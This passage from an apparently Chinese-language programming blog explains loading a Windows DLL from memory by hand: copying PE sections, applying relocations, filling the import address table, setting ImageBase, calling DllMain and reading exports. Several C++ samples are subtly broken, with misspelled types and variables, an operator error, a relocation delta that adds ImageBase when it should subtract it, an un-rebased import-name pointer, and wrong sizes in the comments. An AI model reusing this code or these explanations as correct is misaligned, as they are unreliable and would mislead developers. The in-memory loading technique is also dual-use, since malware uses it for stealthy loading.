_In_ DWORD dwShareMode,         <span class="comment">// 请求的文件或设备的共享模式（可以是读取、写入、删除）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,    <span class="comment">// 指向LPSECURITY_ATTRIBUTES结构的指针, 此参数可以为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationDisposition,   <span class="comment">// 要对存在或不存在的文件或设备执行的操作, 此参数通常设置为OPEN_EXISTING</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwFlagsAndAttributes,    <span class="comment">// 文件或设备属性和标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HANDLE hTemplateFile       <span class="comment">// 具有GENERIC_READ访问权限的模板文件的有效句柄, 此参数可以为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li>如果函数成功, 则返回值是指定文件、设备、命名管道或邮件槽的打开句柄;</li><li>如果函数失败, 则返回值为INVALID_HANDLE_VALUE;</li></ul></div><span class='p medium'>GetFileSize</span><blockquote><p>检索指定文件的大小（以字节为单位）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">GetFileSize</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hFile,      <span class="comment">// 文件句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpFileSizeHigh        <span class="comment">// 指向变量的指针, 其中返回了文件大小的高位双字。如果应用程序不需要高位双字, 此参数可以为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li>如果函数成功, 则返回值为文件大小的低位双字, 如果lpFileSizeHigh为非NULL, 则该函数会将文件大小的高位双字放入该参数指向的变量中;</li><li>如果函数失败且lpFileSizeHigh为NULL, 则返回值INVALID_FILE_SIZE;</li></ul></div><span class='p medium'>ReadFile</span><blockquote><p>从指定的文件或输入&#x2F;输出 (I&#x2F;O) 设备读取数据</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">ReadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hFile,      <span class="comment">// 文件/设备句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,  <span class="comment">// 指向接收从文件或设备读取的数据的缓冲区的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD nNumberOfBytesToRead,    <span class="comment">// 要读取的最多字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpNumberOfBytesRead,  <span class="comment">// 指向变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPOVERLAPPED lpOverlapped   <span class="comment">// 此参数可为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong></strong></p><ul><li>如果函数成功，则返回值为非零 (TRUE);</li><li>如果函数失败或正在异步完成，则返回值为零 (FALSE);</li></ul></div><h3 id="2-FileBuffer-ImageBuffer"><a href="#2-FileBuffer-ImageBuffer" class="headerlink" title="2. FileBuffer &#x3D;&gt; ImageBuffer"></a>2. FileBuffer &#x3D;&gt; ImageBuffer</h3><div class="note info"><p><strong></strong></p><p>将FileBuffer转换成ImageBuffer可以分为两步: </p><ol><li>先将PE头部复制至内存中;</li><li>然后循环将节内容复制过去;</li></ol></div><p>代码示例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MmMapFile</span><span class="params">(LPVOID lpData, LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析PE文件格式</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData);</span><br><span class="line">    <span class="comment">// 获取PE header大小</span></span><br><span class="line">    DWORD dwSizeOfHeaders = pNt-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">    <span class="comment">// 获取节数量</span></span><br><span class="line">    DWORD dwNumOfSections = pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line">    <span class="comment">// 将头部数据复制过去</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(lpBaseAddress, lpData, dwSizeOfHeaders);</span><br><span class="line">    <span class="comment">// 解析第一个节</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">    <span class="comment">// 循环节</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="number">0</span> == pSec[i].VirtualAddress) || (<span class="number">0</span> == pSec[i].PointerToRawData))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LPVOID lpSrcMem = (LPVOID)(pSec[i].PointerToRawData + (DWORD)lpData);</span><br><span class="line">        LPVOID lpDesMem = (LPVOID)(pSec[i].VirtualAddress + (DWORD)lpBaseAddress);</span><br><span class="line">        DWROD dwSizeOfRawData = pSec[i].SizeOfRawData;</span><br><span class="line">        <span class="built_in">RtlCopyMemory</span>(lpDesMem, lpSrcMem, dwSizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-修正重定位表"><a href="#3-修正重定位表" class="headerlink" title="3. 修正重定位表"></a>3. 修正重定位表</h3><div class="note info"><p><strong>重定位表</strong></p><ul><li>Relocation(重定位)是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中, 由于程序中使用了各种全局变量和函数, 这些变量和函数的地址还没有确定, 因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时, 这些相对地址需要被修正为实际的绝对地址, 这个过程就是重定位;</li><li>在Windows操作系统中, 程序被加载到内存中运行时, 需要将程序中的各种内存地址进行重定位, 以使程序能正确运行。Windows系统使用PE(Portable Executable)文件格式来存储可执行程序, 其中包括重定位信息。当程序被加载到内存中时, 系统会解析这些重定位信息, 并将程序中的各种内存地址进行重定位。</li><li>重定位表一般出现在<code>Dll</code>中, 因为<code>Dll</code>都是动态加载, 所以地址不固定, Dll的入口点在整个执行过程中至少要执行2次, 一次时在开始时执行初始化工作, 一次则是在结束时做最后的收尾工作, 重定位表则是解决Dll的地址问题;</li></ul></div><p>重定位表的结构</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84.png' data-fancybox='default' data-caption='重定位结构'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="重定位结构"></a><span class='image-caption'>重定位结构</span></div></div><p>代码示例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DoRelocationTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析PE</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBaseAddress);</span><br><span class="line">    <span class="comment">// 定位重定位位置</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">    <span class="comment">// 获取重定位表</span></span><br><span class="line">    PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)(pDataDir-&gt;VirtualAddress + (DWORD)lpBaseAddress);</span><br><span class="line">    <span class="comment">// 判断是否有重定位表, 数据目录表不存在时, VirtualAddress为0, 也就是指向映像基址</span></span><br><span class="line">    <span class="keyword">if</span> ((LPVOID)pLoc == lpBaseAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环重定位表, 重定位表VirtualAddress和SizeOfBlock都为0表示重定位表结束</span></span><br><span class="line">    <span class="keyword">while</span>((pLoc.VirtualAddress + pLoc-&gt;SizeOfBlock) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 重定位数据, 位于IMAGE_BASE_RELOCATION表开头8字节之后</span></span><br><span class="line">        PWORD pLocData = (PWORD)((PBYTE)pLoc + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">        <span class="comment">// 计算本节需要修正的重定位项（地址）的数目, 每个数据都是16字节（4+12字节, 高4位表示重定位类型, 低12位为RVA）</span></span><br><span class="line">        <span class="comment">// SizeOfBlock的值包括了SizeOfBlock和VirtualAddress的大小, 8字节需要减去</span></span><br><span class="line">        DWORD dwNumOfpLoc = (pLoc-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumOfpLoc; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 高位为3表示有效重定位</span></span><br><span class="line">            <span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 需要修正的数据</span></span><br><span class="line">                <span class="comment">// 修正重定位数据, 重定位表记录的是存在硬编码的地址, 以基址+偏移的形式</span></span><br><span class="line">                <span class="comment">// 存在硬编码的地址 = 重定位基址 + 重定位表数据偏移</span></span><br><span class="line">                <span class="comment">//      = 基址 + 重定位地址 + 重定位数据（数据后12位）</span></span><br><span class="line">                PDWORD pAddress = (PDWORD)((PBYTE)pDos + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">                <span class="comment">// 重定位地址 = 硬编码地址 - ImageBase + 实际基地址</span></span><br><span class="line">                <span class="comment">//           = 实际基地址 - ImageBase + 硬编码地址</span></span><br><span class="line">                <span class="comment">// *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos;</span></span><br><span class="line">                DWORD dwDelta = (DWORD)pDos + pNt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">                *pAddress += dwDelta;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 循环下一个重定位区段</span></span><br><span class="line">        pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-修正导入表"><a href="#4-修正导入表" class="headerlink" title="4. 修正导入表"></a>4. 修正导入表</h3><p>PE加载器在加载PE的时候会将导入函数的地址填入导入地址表中, 导入表结构如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA) 导入名称表RVA</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses) 导入地址表RVA</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>主要用到的是OriginalFirstThunk和FirstThunk; 这两个表用到的结构体是一样的(IMAGE_THUNK_DATA):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>如果指向导入名称表; 则内容是AddressOfData, 指向IMAGE_IMPORT_BY_NAME结构体;<br>如果指向导入地址表:</p><ul><li>序号导入的话, Ordinal首位是1, 低4位是导入序号;</li><li>名称导入的话, Function的值是函数地址;</li></ul><p>这里我们需要将导入函数的地址填入导入地址表中, 所以需要知道这个函数是怎么导入的, 然后通过GetProcAddress API获取函数地址, 然后将函数地址填入导入地址表中;</p><p>通过GetProcAddress获取函数地址, 需要知道Dll名称, 通过Dll名称获取模块句柄</p><p>所以代码流程是:</p><div class="note info"><p><strong>修正导入表流程</strong></p><ul><li>先获取导入表数组的数量和第一个成员的地址;</li><li>根据导入表的数量, 进行循环遍历;<ol><li>获取导入名称表;</li><li>获取导入地址表;</li><li>进行导入名称表的遍历(导入名称表数组以0作为最后一个成员结束);<ul><li>获取导入函数的名称或序号；</li><li>加载这个Dll, 通过名称或序号, 获取其函数地址;</li><li>将地址填入导入地址表;</li><li>进入下一次循环;</li></ul></li><li>进入下一次循环;</li></ol></li><li>两次遍历完成后, 导入表就已经完成了修正;</li></ul></div><p>代码示例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DoImportTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析PE结构</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT);</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pDir-&gt;VirtualAddress + (DWORD)pDos);</span><br><span class="line">    <span class="comment">// 循环遍历Dll导入表中的Dll以及获取导入表中的函数地址</span></span><br><span class="line">    <span class="type">char</span>* szDllName = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_THUNK_DATA pImportNameArray = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_BY_NAME pImportByName = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_THUNK_DATA pImportFuncAddrArray = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC pfFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span> == pImport-&gt;OriginalFirstThunk)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取导入表中Dll的名称并加载Dll</span></span><br><span class="line">        szDllName = (<span class="type">char</span>*)(pImport-&gt;Name + (DWORD)pDos);</span><br><span class="line">        hDll = <span class="built_in">GetModuleHandleA</span>(szDllName);</span><br><span class="line">        <span class="keyword">if</span>(hDll == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            hDll = <span class="built_in">LoadLibraryA</span>(szDllName);</span><br><span class="line">            <span class="keyword">if</span>(hDll == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                pImport++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span></span><br><span class="line">        pImportNameArray = (PIMAGE_THUNK_DATA)(pImport-&gt;OriginalFirstThunk + (DWORD)pDos);</span><br><span class="line">        <span class="comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span></span><br><span class="line">        pImportFuncAddrArray = (PIMAGE_THUNK_DATA)(pImport-&gt;FirstThunk + (DWORD)pDos);</span><br><span class="line">        <span class="keyword">while</span>(TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> == pImportNameArray[i].u1.AddressOfData)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 获取IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">            pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImportNameArray[i].u1.AddressOfData);</span><br><span class="line">            <span class="comment">// 判断导出函数是序号导出还是函数名称导出</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0x80000000</span> &amp; pImportNameArrar[i].u1.Ordinal)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 序号导出</span></span><br><span class="line">                <span class="comment">// 当IMPORT_THUNK_DATA值的最高位为1时, 表示函数以序号方式导出, 此时低位被看作是一个函数序号</span></span><br><span class="line">                pfFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)(pImportNameArray[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 名称导出</span></span><br><span class="line">                pfFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)pImportByName-&gt;Name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 注意此处的函数地址表的赋值, 要对照PE格式进行装载</span></span><br><span class="line">            pImportFuncAddrArray[i].u1.Function = (DWORD)pfFuncAddress;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-修改Dll的加载基址ImageBase"><a href="#5-修改Dll的加载基址ImageBase" class="headerlink" title="5. 修改Dll的加载基址ImageBase"></a>5. 修改Dll的加载基址ImageBase</h3><div class="note info"><p><strong></strong></p><ul><li>PE加载器在加载PE的时候会将进程分配的基地址填入扩展头的ImageBase中;</li></ul></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetImageBase</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    pNt-&gt;OptionalHeader.ImageBase = (DWORD)lpBaseAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-修改DllMain入口点"><a href="#6-修改DllMain入口点" class="headerlink" title="6. 修改DllMain入口点"></a>6. 修改DllMain入口点</h3><div class="note info"><p><strong></strong></p><ul><li>调用Dll的入口函数DllMain, 函数地址则是PE文件的入口点;</li></ul></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CallDllMain</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    typedef_DllMain DllMain = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    DllMain = (typedef_DllMain)(pNt-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD)pDos);</span><br><span class="line">    <span class="comment">// 调用入口函数, 附加进程DLL_PROCESS_ATTACH</span></span><br><span class="line">    BOOL bRet = <span class="built_in">DllMain</span>((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-获取Dll导出函数"><a href="#7-获取Dll导出函数" class="headerlink" title="7. 获取Dll导出函数"></a>7. 获取Dll导出函数</h3><div class="note info"><p><strong>导出表</strong></p><ul><li>PE文件运行, 需要依赖Dll; 系统Dll包括Kernel32.dll、User32.dll等;</li><li>导出表时当前PE文件提供了哪些函数给别人使用;</li><li>不管是exe还是Dll, 本质都是PE文件; exe文件也可以导出函数给别人使用; 一般exe没有, 但不是不可以;</li></ul></div><p>导出表结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   Characteristics;        <span class="comment">// </span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// 时间戳, 编译时间; 把秒转为时间, 可以知道这个Dll是什么时候编译出来的</span></span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;                   <span class="comment">// 指向该导出表文件名的字符串, 也就是这个Dll的名称(RVA)</span></span><br><span class="line">    DWORD   Base;                   <span class="comment">// 导出函数的起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;      <span class="comment">// 所有导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;          <span class="comment">// 以名称导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image（导出的函数地址表）</span></span><br><span class="line">    